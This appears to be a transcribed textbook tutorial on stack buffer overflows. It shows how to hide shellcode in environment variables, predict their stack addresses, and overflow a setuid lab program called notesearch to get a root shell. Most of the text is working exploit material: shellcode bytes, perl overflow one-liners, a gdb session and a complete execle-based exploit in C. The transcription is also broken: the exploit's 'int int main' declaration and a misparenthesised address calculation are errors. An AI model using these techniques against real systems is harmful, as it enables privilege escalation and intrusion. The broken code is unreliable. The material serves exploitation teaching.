Sometimes a buffer will be too small to hold even shellcode
Fortunately, there are other locations in memory where shellcode can be stashed
Environment variables are used by the user shell for a variety of things, but what they are used for isn't as important as the fact that they are located on the stack and can be set from the shell
The example below sets an environment variable called MYVAR to the string test
This environment variable can be accessed by prepending a dollar sign to its name
In addition, the env command will show all the environment variables

__________________________________________________________________________________
reader@hacking:~/booksrc $ export MYVAR=test
reader@hacking:~/booksrc $ echo $MYVAR
test
reader@hacking:~/booksrc $ env
SSH_AGENT_PID=7531
SHELL=/bin/bash
DESKTOP_STARTUP_ID=
TERM=xterm
GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2
WINDOWID=39845969
OLDPWD=/home/reader
USER=reader
LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35:
SSH_AUTH_SOCK=/tmp/ssh-EpSEbS7489/agent.7489
GNOME_KEYRING_SOCKET=/tmp/keyring-AyzuEi/socket
SESSION_MANAGER=local/hacking:/tmp/.ICE-unix/7489
USERNAME=reader
DESKTOP_SESSION=default.desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
GDM_XSERVER_LOCATION=local
PWD=/home/reader/booksrc
LANG=en_US.UTF-8
GDMSESSION=default.desktop
HISTCONTROL=ignoreboth
HOME=/home/reader
SHLVL=1
GNOME_DESKTOP_SESSION_ID=Default
LOGNAME=reader
DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-
DxW6W1OH1O,guid=4f4e0e9cc6f68009a059740046e28e35
LESSOPEN=| /usr/bin/lesspipe %s
DISPLAY=:0.0
MYVAR=test
LESSCLOSE=/usr/bin/lesspipe %s %s
RUNNING_UNDER_GDM=yes
COLORTERM=gnome-terminal
XAUTHORITY=/home/reader/.Xauthority
_=/usr/bin/env
__________________________________________________________________________________

Similarly, the shellcode can be put in an environment variable, but first it needs to be in a form we can easily manipulate
The shellcode from the notesearch exploit can be used; we just need to put it into a file in binary form
The standard shell tools of head, grep and cut can be used to isolate just the hex-expanded bytes of the shellcode

__________________________________________________________________________________
reader@hacking:~/booksrc $ head exploit_notesearch.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
    unsigned int i, *ptr, ret, offset=270;
reader@hacking:~/booksrc $ head exploit_notesearch.c | grep "^\""
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";
reader@hacking:~/booksrc $ head exploit_notesearch.c | grep "^\"" | cut -d\" -f2
\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68
\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89
\xe1\xcd\x80
__________________________________________________________________________________

The first 10 lines of the program are piped into grep, which only shows the lines that begin with a quotation mark
This isolates the lines containing the shellcode, which are then piped into cut using options to display only the bytes between 2 quotation marks

BASH's for loop can be used to send each of these lines to an echo command, with command-line options to recognize hex expansion and to suppress adding a newline character to the end

__________________________________________________________________________________
reader@hacking:~/booksrc
 $ for i in $(head exploit_notesearch.c | grep "^\"" | cut -d\" -f2)
> do
> echo -en $i
> done > shellcode.bin
reader@hacking:~/booksrc $ hexdump -C shellcode.bin
00000000    31 c0 31 db 31  c9 99 b0     a4 cd 80 6a 0b 58 51 68      |1.1.1......j.XQh| 
00000010    2f 2f 73 68 68  2f 62 69     6e 89 e3 51 89 e2 53 89      |//shh/bin..Q..S.| 
00000020    e1 cd 80                                                  |...| 
00000023         
__________________________________________________________________________________

Now, we have the shellcode in a file called shellcode.bin
This can be used with command substitution to put shellcode into an environment variable, along with a generous NOP sled

__________________________________________________________________________________
reader@hacking:~/booksrc $ export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
reader@hacking:~/booksrc $ echo $SHELLCODE
.
.
.
__________________________________________________________________________________

And just like that, the shellcode is now on the stack in an environment variable, along with a 200-byte NOP sled
This means we just need to find an address somewhere in that range of the sled to overwrite the saved return address with
The environment variables are located near the bottom of the stack, so this is where we should look when running notesearch in debugger

__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q ./notesearch
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) break main
Breakpoint 1 at 0x804873c
(gdb) run
Starting program: /home/reader/booksrc/notesearch

Breakpoint 1, 0x0804873c in main ()
__________________________________________________________________________________

A breakpoint is set at the beginnig of main(), and the program is run
This will set up memory for the program, but it will stop before anything happens
Now we can examine memory down near the bottom of stack

__________________________________________________________________________________
(gdb) i r esp
esp       0xbffff660       0xbffff660
(gdb) x/24s $esp + 0x240
0xbffff8a0:      "" 
0xbffff8a1:      "" 
0xbffff8a2:      "" 
0xbffff8a3:      "" 
0xbffff8a4:      "" 
0xbffff8a5:      "" 
0xbffff8a6:      "" 
0xbffff8a7:      "" 
0xbffff8a8:      "" 
0xbffff8a9:      "" 
0xbffff8aa:      "" 
0xbffff8ab:      "i686" 
0xbffff8b0:      "/home/reader/booksrc/notesearch" 
0xbffff8d0:      "SSH_AGENT_PID=7531"
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
0xbffff8e3:      "SHELLCODE=", '\220' <repeats 190 times>... 
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
0xbffff9ab:      "\220\220\220\220\220\220\220\220\220\2201ï¿1⁄21ï¿1⁄21ï¿1⁄2\231ï¿1⁄2ï¿1⁄2ï¿1⁄2\200j\vXQh//shh/bin\211ï¿1⁄2Q\211ï¿1⁄2S\211ï¿1⁄2ï¿1⁄2\200"
0xbffff9d9:      "TERM=xterm" 
0xbffff9e4:      "DESKTOP_STARTUP_ID=" 
0xbffff9f8:      "SHELL=/bin/bash" 
0xbffffa08:      "GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2" 
0xbffffa43:      "WINDOWID=39845969" 
0xbffffa55:      "USER=reader" 
0xbffffa61:      "LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=0"...
0xbffffb29:      "1;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=0"...
(gdb) x/s 0xbffff8e3
0xbffff8e3:      "SHELLCODE=", '\220' <repeats 190 times>... 
(gdb) x/s 0xbffff8e3 + 100
0xbffff947:      '\220' <repeats 110 times>, "1ï¿1⁄21ï¿1⁄21ï¿1⁄2\231ï¿1⁄2ï¿1⁄2ï¿1⁄2\200j\vXQh//shh/bin\211ï¿1⁄2Q\211ï¿1⁄2S\211ï¿1⁄2ï¿1⁄2\200"
__________________________________________________________________________________

The debugger reveals the location of the shellcode, as marked above
(When the program is run outside of the debugger, these addresses might be a little different)
The debugger also has some information on the stack, which shifts the addresses around a bit
But with a 200-byte NOP sled, these inconsistencies aren't a problem if an address near the middle of the sled is picked
In the output above, the address 0xbffff947 is shown to be close to the middle of the NOP sled, which should give us enough wiggle room
After determining the address of the injected shellcode instructions, the exploitation is simply a matter of overwriting the return address with this address

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x47\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
sh-3.2# whoami
root
__________________________________________________________________________________

The target address is repeated enough times to overflow the return address, and execution returns into the NOP sled in the environment variable, which inevitably leads to the shellcode
In situation where the overflow buffer isn't large enough to hold shellcode, an environment variable can be used with a large NOP sled
This usually makes exploitation quite a bit easier

A huge NOP sled is a great aid when you need to guess at the target return addresses, but it turns out that the locations of environment variables are easier to predict than the locations of local stack variables
In C's standard library there is a function called getenv(), which accepts the name of an environment variable as its only argument and returns that variable's memory address


getenv_example.c
__________________________________________________________________________________
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
__________________________________________________________________________________

When compiled and run, this program will display the location of a given environment variable in its memory
This provides a much more accurate prediction of where the same environment variable will be when the target program is run
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc getenv_example.c
reader@hacking:~/booksrc $ ./a.out SHELLCODE
SHELLCODE is at 0xbffff90b
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x0b\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
sh-3.2#
__________________________________________________________________________________

This is accurate enough with a large NOP sled, but when the same thing is attempted without a sled, the program crashes
This means the environment prediction is still off

__________________________________________________________________________________
reader@hacking:~/booksrc $ export SLEDLESS=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./a.out SLEDLESS
SLEDLESS is at 0xbfffff46
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x46\xff\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
Segmentation fault
__________________________________________________________________________________

In order to be able to predict an exact memory address, the differences in the addresses must be explored
The length of the name of the program being executed seems to have an effect on the address of the environment variables
This effect can be further explored by changing the name of the program and experimenting
This type of experimentation and pattern recognition is an important skill for a hacker to have
__________________________________________________________________________________
reader@hacking:~/booksrc $ cp a.out a
reader@hacking:~/booksrc $ ./a SLEDLESS
SLEDLESS is at 0xbfffff4e
reader@hacking:~/booksrc $ cp a.out bb
reader@hacking:~/booksrc $ ./bb SLEDLESS
SLEDLESS is at 0xbfffff4c
reader@hacking:~/booksrc $ cp a.out ccc
reader@hacking:~/booksrc $ ./ccc SLEDLESS
SLEDLESS is at 0xbfffff4a
reader@hacking:~/booksrc $ ./a.out SLEDLESS
SLEDLESS is at 0xbfffff46
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfffff4e - 0xbfffff46
$1 = 8
(gdb) quit
__________________________________________________________________________________

As the preceding experiment shows, the length of the name of the executing program has an effect on the location of exported environment variables
The general trend seems to be a decrease of 2 bytes in the address of the environment variable for every 1 byte increase in the length of the program name
This holds true with the program name a.out, since the difference in length between the names a.out and a is 4 bytes and the difference in length between the address 0xbfffff4e and 0xbfffff46 is 8 bytes
This must mean the name of the executing program is also located on the stack somewhere, which is causing the shifting

Armed with this knowledge, the exact address of the environment variable can be predicted when the vulnerable program is executed
This means the crutch of a NOP sled can be eliminated 
The getenvaddr.c program adjusts the address based on the difference in program name length ti provide a very accurate prediction

getenvaddr.c
__________________________________________________________________________________
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if(argc < 3) {
        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* Get env var location */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name */
    printf("%s will be at %p\n", argv[1], ptr);
}
__________________________________________________________________________________

When compiled, this program can accurately predict where an environment variable will be in memory during a target program's execution
This can be used to exploit stack-based buffer overflows without the need for a NOP sled

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -o getenvaddr getenvaddr.c
reader@hacking:~/booksrc $ ./getenvaddr SLEDLESS ./notesearch
SLEDLESS will be at 0xbfffff3c
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x3c\xff\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
sh-3.2#
__________________________________________________________________________________

As seen above, exploit code isn't always needed to exploit programs
The use of environment variables simplifies things considerably when exploiting from the command line, but these variables can also be used to make exploit code more reliable

The system() function is used in the exploit_notesearch.c program to execute a command
This function starts a new process and runs the command using /bin/sh -c
The -c tells the sh program to execute commands from the command-line argument passed to it
Google's code search can be used to find the source code for this function, which tells us more

Code from libc-2.2.2
__________________________________________________________________________________
int system(const char * cmd)
{
    int ret, pid, waitstat;
    void (*sigint) (), (*sigquit) ();

    if ((pid = fork()) == 0) {
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        exit(127);
    }
    if(pid < 0) return (127 << 8);
    sigint = signal(SIGINT, SIG_IGN);
    sigquit = signal(SIGQUIT, SIG_IGN);
    while ((waitstat = wait(&ret)) != pid && waitstat != -1);
    if (waitstat == -1) ret = -1;
    signal(SIGINT, sigint);
    signal(SIGQUIT, sigquit);
    return(ret);
}
__________________________________________________________________________________

The important part of this function is the if-condition part
The fork() function starts a new process, and the execl() function is used to run the command through /bin/sh with the appropriate command-line arguments

The use of system() can sometimes cause problems
If a setuid program uses system(), the privileges won't be transfered, beacuse /bin/sh has been dropping privileges since version 2
This isn't the case with our exploit, but the exploit doesn't really need to be starting a new process, either
We can ignore the fork() and just focus on the execl() function to run the command

The execl() function belongs to a family of functions that execute commands by replacing the current process with the new one
The arguments for execl() start with the path to the target program and are followed by each of the command-line arguments
The second function argument is actually the zeroeth command-line argument, which is the name of the program
The last argument is a NULL to terminate the argument list, similar to how a null byte terminates a string

The execl() function has a sister function called execle(), which has one additional argument to specify the environment under which the executing process should run
This environment is presented in the form of an array of pointers to null-terminated strings for each environment variable, and the environment array itself is terminated with a NULL pointer
What this means is that a new environment will be created with only the environment variables set by the programmer

With execl(), the existing environment is used, but if you use execle(), the entire environment can be specified
If the environment array is just the shellcode as the first string(with a NULL pointer to terminate the list), the only environment variable will be the shellcode
This makes its address easy to calculate
In Linux, the address will be 0xbffffffa(the highest address in the stack), minus the length of the shellcode in the environment, minus the length of the name of the executed program
Since this address will be exact, there is no need for a NOP sled
All that's needed in the exploit buffer is the address(of the shellcode in the environment), repeated enough times to overflow the return address in the stack, as shown below:

exploit_notesearch_env.c
__________________________________________________________________________________
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int int main(int argc, char *argv[])
{
	char *env[2] = {shellcode, 0};
	unsigned int i, ret;

	char *buffer = (char *) malloc(160);

	ret = 0xbffffffa - ((sizeof(shellcode)-1) - strlen("./notesearch"));
	for(i=0; i < 160; i+=4)
		*((unsigned int *)(buffer + i)) = ret;

	execle("./notesearch", "notesearch", buffer, 0, env);
	free(buffer);
}
__________________________________________________________________________________

This exploit is more reliable, since it doesn't need a NOP sled or any guesswork regarding offsets
Also, it doesn't start any additional processes

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc exploit_notesearch_env.c
reader@hacking:~/booksrc $ ./a.out
-------[ end of note data ]-------
sh-3.2#
__________________________________________________________________________________
